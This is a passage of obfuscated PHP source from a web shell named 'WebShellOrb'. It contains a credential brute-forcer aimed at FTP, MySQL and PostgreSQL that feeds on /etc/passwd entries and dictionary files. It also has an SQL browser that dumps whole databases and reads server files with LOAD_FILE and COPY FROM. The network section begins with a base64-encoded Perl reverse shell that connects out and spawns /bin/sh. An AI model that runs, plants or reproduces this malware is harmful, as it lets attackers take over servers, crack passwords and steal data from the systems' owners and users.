                ${"GLOBALS"}["estwoghymkq"] = "res";
                ${${"GLOBALS"}["nzxrekzw"]} = @mysql_connect(${${"GLOBALS"}["qelasgmoq"]} . ":" . (${${"GLOBALS"}["nhegyujkbg"]} ? ${${"GLOBALS"}["wrqqkvfiw"]} : 3306), ${${"GLOBALS"}["jhqqekpgddc"]}, ${${"GLOBALS"}["icduirvc"]});
                @mysql_close(${$xzunqnw});
                return ${${"GLOBALS"}["estwoghymkq"]};
            }
        } elseif ($_POST["proto"] == "pgsql") {
            function WebShellOrbBruteForce($ip, $port, $login, $pass)
            {
                ${"GLOBALS"}["qgtevigiolv"] = "pass";
                $kgcwsyxmq = "str";
                $tjassyjer = "port";
                $lgcepsiowx = "str";
                ${$kgcwsyxmq} = "host='" . ${${"GLOBALS"}["qelasgmoq"]} . "' port='" . ${$tjassyjer} . "' user='" . ${${"GLOBALS"}["bdrlwjttk"]} . "' password='" . ${${"GLOBALS"}["qgtevigiolv"]} . "' dbname=postgres";
                ${${"GLOBALS"}["ymhnnp"]} = @pg_connect(${$lgcepsiowx});
                ${"GLOBALS"}["xtwmvqil"] = "res";
                @pg_close(${${"GLOBALS"}["ymhnnp"]});
                return ${${"GLOBALS"}["xtwmvqil"]};
            }
        }
        ${"GLOBALS"}["mtnbnvahk"] = "attempts";
        $sdtrshb = "server";
        ${${"GLOBALS"}["nscqaqn"]} = 0;
        ${${"GLOBALS"}["mtnbnvahk"]} = 0;
        ${$sdtrshb} = explode(":", $_POST["server"]);
        if ($_POST["type"] == 1) {
            ${${"GLOBALS"}["mercgmdwe"]} = @file("/etc/passwd");
            if (is_array(${${"GLOBALS"}["mercgmdwe"]})) {
                ${"GLOBALS"}["snenajn"] = "line";
                foreach (${${"GLOBALS"}["mercgmdwe"]} as ${${"GLOBALS"}["snenajn"]}) {
                    ${"GLOBALS"}["bgxqffvest"] = "server";
                    ${"GLOBALS"}["vrwvhlemm"] = "line";
                    $lkfguubws = "line";
                    ${"GLOBALS"}["ceixzegqt"] = "line";
                    ${${"GLOBALS"}["ceixzegqt"]} = explode(":", ${$lkfguubws});
                    $odemeqxd = "line";
                    ++${${"GLOBALS"}["civkgkkc"]};
                    if (WebShellOrbBruteForce(@${${"GLOBALS"}["nnwtcnvv"]}[0], @${${"GLOBALS"}["bgxqffvest"]}[1], ${${"GLOBALS"}["vrwvhlemm"]}[0], ${$odemeqxd}[0])) {
                        ${${"GLOBALS"}["nscqaqn"]}++;
                        echo "<b>" . htmlspecialchars(${${"GLOBALS"}["omanxfropl"]}[0]) . "</b>:" . htmlspecialchars(${${"GLOBALS"}["omanxfropl"]}[0]) . "<br>";
                    }
                    if (@$_POST["reverse"]) {
                        $cfxddtbkve = "attempts";
                        $gfxuhsrtkeve = "line";
                        ${"GLOBALS"}["tdkpthocifar"] = "tmp";
                        $vrbvgxqwmgy = "i";
                        ${${"GLOBALS"}["ecbcmiybue"]} = "";
                        ${"GLOBALS"}["iqktzfnl"] = "i";
                        $cludwpcuhof = "i";
                        $qsuknriguig = "tmp";
                        for (${$cludwpcuhof} = strlen(${${"GLOBALS"}["omanxfropl"]}[0]) - 1; ${${"GLOBALS"}["iqktzfnl"]} >= 0; --${${"GLOBALS"}["clkuyojj"]}) {
                            ${${"GLOBALS"}["tdkpthocifar"]} .= ${$gfxuhsrtkeve}[0][${$vrbvgxqwmgy}];
                        }
                        ++${$cfxddtbkve};
                        if (WebShellOrbBruteForce(@${${"GLOBALS"}["nnwtcnvv"]}[0], @${${"GLOBALS"}["nnwtcnvv"]}[1], ${${"GLOBALS"}["omanxfropl"]}[0], ${$qsuknriguig})) {
                            ${"GLOBALS"}["uhirxfxp"] = "success";
                            $fhhrngya = "tmp";
                            ${${"GLOBALS"}["uhirxfxp"]}++;
                            echo "<b>" . htmlspecialchars(${${"GLOBALS"}["omanxfropl"]}[0]) . "</b>:" . htmlspecialchars(${$fhhrngya});
                        }
                    }
                }
            }
        } elseif ($_POST["type"] == 2) {
            ${"GLOBALS"}["seukopj"] = "temp";
            ${${"GLOBALS"}["seukopj"]} = @file($_POST["dict"]);
            if (is_array(${${"GLOBALS"}["mercgmdwe"]})) {
                $cpxpxkucuiy = "temp";
                foreach (${$cpxpxkucuiy} as ${${"GLOBALS"}["omanxfropl"]}) {
                    $jidncks = "server";
                    ${"GLOBALS"}["tmyvgbh"] = "attempts";
                    ${"GLOBALS"}["llsukg"] = "server";
                    ${"GLOBALS"}["icdufnwd"] = "line";
                    ${${"GLOBALS"}["icdufnwd"]} = trim(${${"GLOBALS"}["omanxfropl"]});
                    ++${${"GLOBALS"}["tmyvgbh"]};
                    if (WebShellOrbBruteForce(${${"GLOBALS"}["llsukg"]}[0], @${$jidncks}[1], $_POST["login"], ${${"GLOBALS"}["omanxfropl"]})) {
                        ${"GLOBALS"}["joqkwowlnat"] = "success";
                        $kubptgfdsmd = "line";
                        ${${"GLOBALS"}["joqkwowlnat"]}++;
                        echo "<b>" . htmlspecialchars($_POST["login"]) . "</b>:" . htmlspecialchars(${$kubptgfdsmd}) . "<br>";
                    }
                }
            }
        }
        echo "<span>Attempts:</span> {$attempts} <span>Success:</span> {$success}</div><br>";
    }
    echo "<h1>Bruteforce</h1><div class=content><table><form method=post><tr><td><span>Type</span></td>" . "<td><select name=proto><option value=ftp>FTP</option><option value=mysql>MySql</option><option value=pgsql>PostgreSql</option></select></td></tr><tr><td>" . "<input type=hidden name=c value=\"" . htmlspecialchars($GLOBALS["cwd"]) . "\">" . "<input type=hidden name=a value=\"" . htmlspecialchars($_POST["a"]) . "\">" . "<input type=hidden name=charset value=\"" . htmlspecialchars($_POST["charset"]) . "\">" . "<span>Server:port</span></td>" . "<td><input type=text name=server value=\"127.0.0.1\"></td></tr>" . "<tr><td><span>Brute type</span></td>" . "<td><label><input type=radio name=type value=\"1\" checked> /etc/passwd</label></td></tr>" . "<tr><td></td><td><label style=\"padding-left:15px\"><input type=checkbox name=reverse value=1 checked> reverse (login -> nigol)</label></td></tr>" . "<tr><td></td><td><label><input type=radio name=type value=\"2\"> Dictionary</label></td></tr>" . "<tr><td></td><td><table style=\"padding-left:15px\"><tr><td><span>Login</span></td>" . "<td><input type=text name=login value=\"root\"></td></tr>" . "<tr><td><span>Dictionary</span></td>" . "<td><input type=text name=dict value=\"" . htmlspecialchars($GLOBALS["cwd"]) . "passwd.dic\"></td></tr></table>" . "</td></tr><tr><td></td><td><input type=submit value=\">>\"></td></tr></form></table>";
    echo "</div><br>";
    WebShellOrbFooter();
}
function actionSql()
{
    class DbClass
    {
        var $type;
        var $link;
        var $res;
        function DbClass7($type)
        {
            $this->type = ${${"GLOBALS"}["vxhdoihqlkd"]};
        }
        function connect($host, $user, $pass, $dbname)
        {
            ${"GLOBALS"}["nokxynmmh"] = "user";
            switch ($this->type) {
                case "mysql":
                    if ($this->link = @mysql_connect($host, ${${"GLOBALS"}["nokxynmmh"]}, ${${"GLOBALS"}["icduirvc"]}, true)) {
                        return true;
                    }
                    break;
                case "pgsql":
                    $host = explode(":", $host);
                    if (!$host[1]) {
                        $host[1] = 5432;
                    }
                    if ($this->link = @pg_connect("host={$host[0]} port={$host[1]} user={$user} password={$pass} dbname={$dbname}")) {
                        return true;
                    }
                    break;
            }
            return false;
        }
        function selectdb($db)
        {
            switch ($this->type) {
                case "mysql":
                    if (@mysql_select_db(${${"GLOBALS"}["bopmwejgirf"]})) {
                        return true;
                    }
                    break;
            }
            return false;
        }
        function query($str)
        {
            switch ($this->type) {
                case "mysql":
                    return $this->res = @mysql_query(${${"GLOBALS"}["lhydmmywwn"]});
                    break;
                case "pgsql":
                    return $this->res = @pg_query($this->link, ${${"GLOBALS"}["lhydmmywwn"]});
                    break;
            }
            return false;
        }
        function fetch()
        {
            $cqtiiytoxs = "res";
            $lmqgccr = "res";
            ${${"GLOBALS"}["ymhnnp"]} = func_num_args() ? func_get_arg(0) : $this->res;
            switch ($this->type) {
                case "mysql":
                    return @mysql_fetch_assoc(${$cqtiiytoxs});
                    break;
                case "pgsql":
                    return @pg_fetch_assoc(${$lmqgccr});
                    break;
            }
            return false;
        }
        function listDbs()
        {
            switch ($this->type) {
                case "mysql":
                    return $this->query("SHOW databases");
                    break;
                case "pgsql":
                    return $this->res = $this->query("SELECT datname FROM pg_database WHERE datistemplate!='t'");
                    break;
            }
            return false;
        }
        function listTables()
        {
            switch ($this->type) {
                case "mysql":
                    return $this->res = $this->query("SHOW TABLES");
                    break;
                case "pgsql":
                    return $this->res = $this->query("select table_name from information_schema.tables where table_schema != 'information_schema' AND table_schema != 'pg_catalog'");
                    break;
            }
            return false;
        }
        function error()
        {
            switch ($this->type) {
                case "mysql":
                    return @mysql_error();
                    break;
                case "pgsql":
                    return @pg_last_error();
                    break;
            }
            return false;
        }
        function setCharset($str)
        {
            ${"GLOBALS"}["eqobysgmaof"] = "str";
            switch ($this->type) {
                case "mysql":
                    if (function_exists("mysql_set_charset")) {
                        return @mysql_set_charset(${${"GLOBALS"}["lhydmmywwn"]}, $this->link);
                    } else {
                        $this->query("SET CHARSET " . ${${"GLOBALS"}["lhydmmywwn"]});
                    }
                    break;
                case "pgsql":
                    return @pg_set_client_encoding($this->link, ${${"GLOBALS"}["eqobysgmaof"]});
                    break;
            }
            return false;
        }
        function loadFile($str)
        {
            ${"GLOBALS"}["iftfhykrv"] = "r";
            $kvjjxcllg = "str";
            $zuwohcpx = "r";
            switch ($this->type) {
                case "mysql":
                    return $this->fetch($this->query("SELECT LOAD_FILE('" . addslashes(${${"GLOBALS"}["lhydmmywwn"]}) . "') as file"));
                    break;
                case "pgsql":
                    $this->query("CREATE TABLE WebShellOrb2(file text);COPY WebShellOrb2 FROM '" . addslashes(${$kvjjxcllg}) . "';select file from WebShellOrb2;");
                    ${$zuwohcpx} = array();
                    while (${${"GLOBALS"}["clkuyojj"]} = $this->fetch()) {
                        ${${"GLOBALS"}["mwpoytmwus"]}[] = ${${"GLOBALS"}["clkuyojj"]}["file"];
                    }
                    $this->query("drop table WebShellOrb2");
                    return array("file" => implode("\n", ${${"GLOBALS"}["iftfhykrv"]}));
                    break;
            }
            return false;
        }
        function dump($table, $fp = false)
        {
            $lvspedl = "table";
            ${"GLOBALS"}["hclxgckv"] = "create";
            ${"GLOBALS"}["bevvydk"] = "res";
            $fxcpioaubjb = "table";
            ${"GLOBALS"}["vzlphuccp"] = "i";
            ${"GLOBALS"}["llrslc"] = "sql";
            ${"GLOBALS"}["qvbkbpidxc"] = "item";
            $gdtnlefrsw = "item";
            switch ($this->type) {
                case "mysql":
                    ${${"GLOBALS"}["ymhnnp"]} = $this->query("SHOW CREATE TABLE `" . ${$lvspedl} . "`");
                    ${${"GLOBALS"}["lfljrdmc"]} = mysql_fetch_array(${${"GLOBALS"}["bevvydk"]});
                    ${${"GLOBALS"}["lwqrio"]} = ${${"GLOBALS"}["hclxgckv"]}[1] . ";\n";
                    if (${${"GLOBALS"}["tbrhqbi"]}) {
                        fwrite(${${"GLOBALS"}["tbrhqbi"]}, ${${"GLOBALS"}["lwqrio"]});
                    } else {
                        echo ${${"GLOBALS"}["llrslc"]};
                    }
                    $this->query("SELECT * FROM `" . ${$fxcpioaubjb} . "`");
                    ${${"GLOBALS"}["vzlphuccp"]} = 0;
                    ${${"GLOBALS"}["sdigtdgih"]} = true;
                    while (${$gdtnlefrsw} = $this->fetch()) {
                        ${${"GLOBALS"}["lwqrio"]} = "";
                        ${"GLOBALS"}["xbengs"] = "columns";
                        $xobgpipr = "sql";
                        if (${${"GLOBALS"}["clkuyojj"]} % 1000 == 0) {
                            ${"GLOBALS"}["xhbwyioli"] = "head";
                            $ogmpcygtnlp = "sql";
                            ${${"GLOBALS"}["xhbwyioli"]} = true;
                            ${$ogmpcygtnlp} = ";\n\n";
                        }
                        $cokvjkyzuyu = "v";
                        $nxxfdqradvx = "k";
                        ${${"GLOBALS"}["xbengs"]} = array();
                        foreach (${${"GLOBALS"}["bdmqwqvfqn"]} as ${$nxxfdqradvx} => ${$cokvjkyzuyu}) {
                            $adukszrwybrf = "item";
                            $tlgrwbkwwn = "k";
                            ${"GLOBALS"}["smdpfjdpe"] = "item";
                            ${"GLOBALS"}["ymypptmvdpea"] = "item";
                            ${"GLOBALS"}["pgbiqyzdgjc"] = "v";
                            ${"GLOBALS"}["bfnoqmsvfd"] = "k";
                            if (${${"GLOBALS"}["pgbiqyzdgjc"]} === null) {
                                ${${"GLOBALS"}["ymypptmvdpea"]}[${$tlgrwbkwwn}] = "NULL";
                            } elseif (is_int(${${"GLOBALS"}["vvdxmjbgec"]})) {
                                ${${"GLOBALS"}["smdpfjdpe"]}[${${"GLOBALS"}["bfnoqmsvfd"]}] = ${${"GLOBALS"}["vvdxmjbgec"]};
                            } else {
                                ${$adukszrwybrf}[${${"GLOBALS"}["oqvryxe"]}] = "'" . @mysql_real_escape_string(${${"GLOBALS"}["vvdxmjbgec"]}) . "'";
                            }
                            ${${"GLOBALS"}["amehtg"]}[] = "`" . ${${"GLOBALS"}["oqvryxe"]} . "`";
                        }
                        $ykwbodcd = "sql";
                        $wqbpixdcuh = "fp";
                        if (${${"GLOBALS"}["sdigtdgih"]}) {
                            $prlzshyyi = "sql";
                            $jotets = "table";
                            ${$prlzshyyi} .= "INSERT INTO `" . ${$jotets} . "` (" . implode(", ", ${${"GLOBALS"}["amehtg"]}) . ") VALUES \n\t(" . implode(", ", ${${"GLOBALS"}["bdmqwqvfqn"]}) . ")";
                            ${${"GLOBALS"}["sdigtdgih"]} = false;
                        } else {
                            ${$xobgpipr} .= "\n\t,(" . implode(", ", ${${"GLOBALS"}["bdmqwqvfqn"]}) . ")";
                        }
                        if (${$wqbpixdcuh}) {
                            fwrite(${${"GLOBALS"}["tbrhqbi"]}, ${$ykwbodcd});
                        } else {
                            echo ${${"GLOBALS"}["lwqrio"]};
                        }
                        ${${"GLOBALS"}["clkuyojj"]}++;
                    }
                    if (!${${"GLOBALS"}["sdigtdgih"]}) {
                        $gitelgqh = "fp";
                        $dhwspxr = "fp";
                        if (${$gitelgqh}) {
                            fwrite(${$dhwspxr}, ";\n\n");
                        } else {
                            echo ";\n\n";
                        }
                    }
                    break;
                case "pgsql":
                    $this->query("SELECT * FROM " . ${${"GLOBALS"}["txyjmywp"]});
                    while (${${"GLOBALS"}["qvbkbpidxc"]} = $this->fetch()) {
                        $dijwkkaxtwh = "v";
                        ${"GLOBALS"}["jwcglmiytjkt"] = "columns";
                        ${"GLOBALS"}["kqlgwiwhg"] = "item";
                        ${"GLOBALS"}["ickjifzf"] = "fp";
                        ${"GLOBALS"}["bhlsyccmb"] = "sql";
                        ${"GLOBALS"}["rqdqvrt"] = "sql";
                        ${"GLOBALS"}["gbnsld"] = "item";
                        ${"GLOBALS"}["ntmqvqy"] = "table";
                        ${${"GLOBALS"}["amehtg"]} = array();
                        foreach (${${"GLOBALS"}["gbnsld"]} as ${${"GLOBALS"}["oqvryxe"]} => ${$dijwkkaxtwh}) {
                            $xtthgqq = "k";
                            ${"GLOBALS"}["imrmoiac"] = "k";
                            ${${"GLOBALS"}["bdmqwqvfqn"]}[${$xtthgqq}] = "'" . addslashes(${${"GLOBALS"}["vvdxmjbgec"]}) . "'";
                            ${${"GLOBALS"}["amehtg"]}[] = ${${"GLOBALS"}["imrmoiac"]};
                        }
                        ${${"GLOBALS"}["bhlsyccmb"]} = "INSERT INTO " . ${${"GLOBALS"}["ntmqvqy"]} . " (" . implode(", ", ${${"GLOBALS"}["jwcglmiytjkt"]}) . ") VALUES (" . implode(", ", ${${"GLOBALS"}["kqlgwiwhg"]}) . ");" . "\n";
                        if (${${"GLOBALS"}["tbrhqbi"]}) {
                            fwrite(${${"GLOBALS"}["ickjifzf"]}, ${${"GLOBALS"}["lwqrio"]});
                        } else {
                            echo ${${"GLOBALS"}["rqdqvrt"]};
                        }
                    }
                    break;
            }
            return false;
        }
    }
    ${${"GLOBALS"}["bopmwejgirf"]} = new DbClass7($_POST["type"]);
    if (@$_POST["p2"] == "download" && @$_POST["p1"] != "select") {
        $db->connect($_POST["sql_host"], $_POST["sql_login"], $_POST["sql_pass"], $_POST["sql_base"]);
        $db->selectdb($_POST["sql_base"]);
        switch ($_POST["charset"]) {
            case "Windows-1251":
                $db->setCharset("cp1251");
                break;
            case "UTF-8":
                $db->setCharset("utf8");
                break;
            case "KOI8-R":
                $db->setCharset("koi8r");
                break;
            case "KOI8-U":
                $db->setCharset("koi8u");
                break;
            case "cp866":
                $db->setCharset("cp866");
                break;
        }
        if (empty($_POST["file"])) {
            ob_start("ob_gzhandler", 4096);
            header("Content-Disposition: attachment; filename=dump.sql");
            header("Content-Type: text/plain");
            foreach ($_POST["tbl"] as ${${"GLOBALS"}["vvdxmjbgec"]}) {
                $db->dump(${${"GLOBALS"}["vvdxmjbgec"]});
            }
            exit;
        } elseif (${${"GLOBALS"}["tbrhqbi"]} = @fopen($_POST["file"], "w")) {
            ${"GLOBALS"}["igwncuwljhcx"] = "v";
            $azcjoee = "fp";
            foreach ($_POST["tbl"] as ${${"GLOBALS"}["igwncuwljhcx"]}) {
                $db->dump(${${"GLOBALS"}["vvdxmjbgec"]}, ${$azcjoee});
            }
            fclose(${${"GLOBALS"}["tbrhqbi"]});
            unset($_POST["p2"]);
        } else {
            die("<script>alert(\"Error! Can't open file\");window.history.back(-1)</script>");
        }
    }
    WebShellOrbHeader();
    echo "\n<h1>Sql browser</h1><div class=content>\n<form name='sf' method='post' onsubmit='fs(this);'><table cellpadding='2' cellspacing='0'><tr>\n<td>Type</td><td>Host</td><td>Login</td><td>Password</td><td>Database</td><td></td></tr><tr>\n<input type=hidden name=a value=Sql><input type=hidden name=p1 value='query'><input type=hidden name=p2 value=''><input type=hidden name=c value='" . htmlspecialchars($GLOBALS["cwd"]) . "'><input type=hidden name=charset value='" . (isset($_POST["charset"]) ? $_POST["charset"] : "") . "'>\n<td><select name='type'><option value='mysql' ";
    if (@$_POST["type"] == "mysql") {
        echo "selected";
    }
    echo ">MySql</option><option value='pgsql' ";
    if (@$_POST["type"] == "pgsql") {
        echo "selected";
    }
    echo ">PostgreSql</option></select></td>\n<td><input type=text name=sql_host value=\"" . (empty($_POST["sql_host"]) ? "localhost" : htmlspecialchars($_POST["sql_host"])) . "\"></td>\n<td><input type=text name=sql_login value=\"" . (empty($_POST["sql_login"]) ? "root" : htmlspecialchars($_POST["sql_login"])) . "\"></td>\n<td><input type=text name=sql_pass value=\"" . (empty($_POST["sql_pass"]) ? "" : htmlspecialchars($_POST["sql_pass"])) . "\"></td><td>";
    ${${"GLOBALS"}["ecbcmiybue"]} = "<input type=text name=sql_base value=''>";
    if (isset($_POST["sql_host"])) {
        ${"GLOBALS"}["hojznwhnacpf"] = "tmp";
        if ($db->connect($_POST["sql_host"], $_POST["sql_login"], $_POST["sql_pass"], $_POST["sql_base"])) {
            switch ($_POST["charset"]) {
                case "Windows-1251":
                    $db->setCharset("cp1251");
                    break;
                case "UTF-8":
                    $db->setCharset("utf8");
                    break;
                case "KOI8-R":
                    $db->setCharset("koi8r");
                    break;
                case "KOI8-U":
                    $db->setCharset("koi8u");
                    break;
                case "cp866":
                    $db->setCharset("cp866");
                    break;
            }
            $db->listDbs();
            echo "<select name=sql_base><option value=''></option>";
            while (${${"GLOBALS"}["bdmqwqvfqn"]} = $db->fetch()) {
                $vutoobappnb = "item";
                ${"GLOBALS"}["dhnqkey"] = "value";
                $dtvsszkh = "key";
                list(${$dtvsszkh}, ${${"GLOBALS"}["xrdbnxfmvt"]}) = each(${$vutoobappnb});
                echo "<option value=\"" . ${${"GLOBALS"}["xrdbnxfmvt"]} . "\" " . (${${"GLOBALS"}["xrdbnxfmvt"]} == $_POST["sql_base"] ? "selected" : "") . ">" . ${${"GLOBALS"}["dhnqkey"]} . "</option>";
            }
            echo "</select>";
        } else {
            echo ${${"GLOBALS"}["hojznwhnacpf"]};
        }
    } else {
        echo ${${"GLOBALS"}["ecbcmiybue"]};
    }
    echo "</td>\n\t\t\t\t<td><input type=submit value='>>' onclick='fs(d.sf);'></td>\n                <td><input type=checkbox name=sql_count value='on'" . (empty($_POST["sql_count"]) ? "" : " checked") . "> count the number of rows</td>\n\t\t\t</tr>\n\t\t</table>\n\t\t<script>\n            s_db='" . @addslashes($_POST["sql_base"]) . "';\n            function fs(f) {\n                if(f.sql_base.value!=s_db) { f.onsubmit = function() {};\n                    if(f.p1) f.p1.value='';\n                    if(f.p2) f.p2.value='';\n                    if(f.p3) f.p3.value='';\n                }\n            }\n\t\t\tfunction st(t,l) {\n\t\t\t\td.sf.p1.value = 'select';\n\t\t\t\td.sf.p2.value = t;\n                if(l && d.sf.p3) d.sf.p3.value = l;\n\t\t\t\td.sf.submit();\n\t\t\t}\n\t\t\tfunction is() {\n\t\t\t\tfor(i=0;i<d.sf.elements['tbl[]'].length;++i)\n\t\t\t\t\td.sf.elements['tbl[]'][i].checked = !d.sf.elements['tbl[]'][i].checked;\n\t\t\t}\n\t\t</script>";
    if (isset(${${"GLOBALS"}["bopmwejgirf"]}) && $db->link) {
        echo "<br/><table width=100% cellpadding=2 cellspacing=0>";
        if (!empty($_POST["sql_base"])) {
            $nejkldo = "item";
            $db->selectdb($_POST["sql_base"]);
            echo "<tr><td width=1 style='border-top:2px solid #666;'><span>Tables:</span><br><br>";
            ${${"GLOBALS"}["dncwbwlrbd"]} = $db->listTables();
            while (${$nejkldo} = $db->fetch(${${"GLOBALS"}["dncwbwlrbd"]})) {
                ${"GLOBALS"}["zsyujlxatpw"] = "value";
                ${"GLOBALS"}["eahhvigh"] = "value";
                list(${${"GLOBALS"}["oocwabo"]}, ${${"GLOBALS"}["eahhvigh"]}) = each(${${"GLOBALS"}["bdmqwqvfqn"]});
                if (!empty($_POST["sql_count"])) {
                    ${${"GLOBALS"}["onmdrx"]} = $db->fetch($db->query("SELECT COUNT(*) as n FROM " . ${${"GLOBALS"}["xrdbnxfmvt"]} . ""));
                }
                ${${"GLOBALS"}["xrdbnxfmvt"]} = htmlspecialchars(${${"GLOBALS"}["xrdbnxfmvt"]});
                echo "<nobr><input type='checkbox' name='tbl[]' value='" . ${${"GLOBALS"}["xrdbnxfmvt"]} . "'>&nbsp;<a href=# onclick=\"st('" . ${${"GLOBALS"}["xrdbnxfmvt"]} . "',1)\">" . ${${"GLOBALS"}["zsyujlxatpw"]} . "</a>" . (empty($_POST["sql_count"]) ? "&nbsp;" : " <small>({$n['n']})</small>") . "</nobr><br>";
            }
            echo "<input type='checkbox' onclick='is();'> <input type=button value='Dump' onclick='document.sf.p2.value=\"download\";document.sf.submit();'><br>File path:<input type=text name=file value='dump.sql'></td><td style='border-top:2px solid #666;'>";
            if (@$_POST["p1"] == "select") {
                $_POST["p1"] = "query";
                ${"GLOBALS"}["yctjrlsembz"] = "num";
                ${"GLOBALS"}["fyolkb"] = "pages";
                $_POST["p3"] = $_POST["p3"] ? $_POST["p3"] : 1;
                $db->query("SELECT COUNT(*) as n FROM " . $_POST["p2"]);
                ${"GLOBALS"}["kjbkzekyzkk"] = "pages";
                ${${"GLOBALS"}["yctjrlsembz"]} = $db->fetch();
                ${"GLOBALS"}["rbfkfawwlp"] = "num";
                ${${"GLOBALS"}["kjbkzekyzkk"]} = ceil(${${"GLOBALS"}["rbfkfawwlp"]}["n"] / 30);
                echo "<script>d.sf.onsubmit=function(){st(\"" . $_POST["p2"] . "\", d.sf.p3.value)}</script><span>" . $_POST["p2"] . "</span> ({$num['n']} records) Page # <input type=text name='p3' value=" . (int) $_POST["p3"] . ">";
                echo " of {$pages}";
                if ($_POST["p3"] > 1) {
                    echo " <a href=# onclick='st(\"" . $_POST["p2"] . "\", " . ($_POST["p3"] - 1) . ")'>&lt; Prev</a>";
                }
                if ($_POST["p3"] < ${${"GLOBALS"}["fyolkb"]}) {
                    echo " <a href=# onclick='st(\"" . $_POST["p2"] . "\", " . ($_POST["p3"] + 1) . ")'>Next &gt;</a>";
                }
                $_POST["p3"]--;
                if ($_POST["type"] == "pgsql") {
                    $_POST["p2"] = "SELECT * FROM " . $_POST["p2"] . " LIMIT 30 OFFSET " . $_POST["p3"] * 30;
                } else {
                    $_POST["p2"] = "SELECT * FROM `" . $_POST["p2"] . "` LIMIT " . $_POST["p3"] * 30 . ",30";
                }
                echo "<br><br>";
            }
            if (@$_POST["p1"] == "query" && !empty($_POST["p2"])) {
                $db->query(@$_POST["p2"]);
                if ($db->res !== false) {
                    $qkoefjgtvmo = "line";
                    $ofantutk = "item";
                    ${${"GLOBALS"}["gletwnspjntd"]} = false;
                    echo "<table width=100% cellspacing=1 cellpadding=2 class=main style=\"background-color:#292929\">";
                    ${$qkoefjgtvmo} = 1;
                    while (${$ofantutk} = $db->fetch()) {
                        ${"GLOBALS"}["gpbpqsokr"] = "title";
                        if (!${${"GLOBALS"}["gpbpqsokr"]}) {
                            $kmifpskdrsr = "item";
                            $cmpvdluse = "title";
                            $gldaewbitzp = "value";
                            ${"GLOBALS"}["pqxgkwxjuja"] = "item";
                            ${"GLOBALS"}["uydjahhmdtj"] = "key";
                            echo "<tr>";
                            foreach (${$kmifpskdrsr} as ${${"GLOBALS"}["oocwabo"]} => ${$gldaewbitzp}) {
                                echo "<th>" . ${${"GLOBALS"}["uydjahhmdtj"]} . "</th>";
                            }
                            reset(${${"GLOBALS"}["pqxgkwxjuja"]});
                            ${$cmpvdluse} = true;
                            echo "</tr><tr>";
                            ${${"GLOBALS"}["omanxfropl"]} = 2;
                        }
                        ${"GLOBALS"}["jlubwufpnia"] = "item";
                        $xxrzgvkzrf = "key";
                        echo "<tr class=\"l" . ${${"GLOBALS"}["omanxfropl"]} . "\">";
                        ${${"GLOBALS"}["omanxfropl"]} = ${${"GLOBALS"}["omanxfropl"]} == 1 ? 2 : 1;
                        foreach (${${"GLOBALS"}["jlubwufpnia"]} as ${$xxrzgvkzrf} => ${${"GLOBALS"}["xrdbnxfmvt"]}) {
                            if (${${"GLOBALS"}["xrdbnxfmvt"]} == null) {
                                echo "<td><i>null</i></td>";
                            } else {
                                echo "<td>" . nl2br(htmlspecialchars(${${"GLOBALS"}["xrdbnxfmvt"]})) . "</td>";
                            }
                        }
                        echo "</tr>";
                    }
                    echo "</table>";
                } else {
                    echo "<div><b>Error:</b> " . htmlspecialchars($db->error()) . "</div>";
                }
            }
            echo "<br></form><form onsubmit='d.sf.p1.value=\"query\";d.sf.p2.value=this.query.value;document.sf.submit();return false;'><textarea name='query' style='width:100%;height:100px'>";
            if (!empty($_POST["p2"]) && $_POST["p1"] != "loadfile") {
                echo htmlspecialchars($_POST["p2"]);
            }
            echo "</textarea><br/><input type=submit value='Execute'>";
            echo "</td></tr>";
        }
        echo "</table></form><br/>";
        if ($_POST["type"] == "mysql") {
            $db->query("SELECT 1 FROM mysql.user WHERE concat(`user`, '@', `host`) = USER() AND `File_priv` = 'y'");
            if ($db->fetch()) {
                echo "<form onsubmit='d.sf.p1.value=\"loadfile\";document.sf.p2.value=this.f.value;document.sf.submit();return false;'><span>Load file</span> <input  class='toolsInp' type=text name=f><input type=submit value='>>'></form>";
            }
        }
        if (@$_POST["p1"] == "loadfile") {
            ${${"GLOBALS"}["kmiihcqpanrs"]} = $db->loadFile($_POST["p2"]);
            echo "<br/><pre class=ml1>" . htmlspecialchars(${${"GLOBALS"}["kmiihcqpanrs"]}["file"]) . "</pre>";
        }
    } else {
        echo htmlspecialchars($db->error());
    }
    echo "</div>";
    WebShellOrbFooter();
}
function actionNetwork()
{
    ${"GLOBALS"}["nyxzxhcxu"] = "back_connect_p";
    WebShellOrbHeader();
    ${${"GLOBALS"}["nyxzxhcxu"]} = "IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
    ${"GLOBALS"}["nlhhszig"] = "bind_port_p";
